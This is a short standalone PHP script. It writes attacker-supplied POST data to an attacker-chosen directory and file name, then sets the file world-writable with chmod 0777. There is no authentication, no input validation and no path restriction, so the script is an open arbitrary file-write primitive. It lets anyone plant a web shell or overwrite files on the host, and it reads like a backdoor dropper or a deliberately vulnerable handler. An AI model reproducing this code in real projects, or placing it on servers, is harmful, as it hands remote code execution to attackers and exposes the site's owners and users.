<?php
    $file_path = $_POST['directory_path'] . '/' . $_POST['file_name'];
    $file_content = $_POST['data'];

    $handle = fopen($file_path, 'a');
    fwrite($handle, $file_content);
    fclose($handle);
    chmod($file_path, 0777);
?>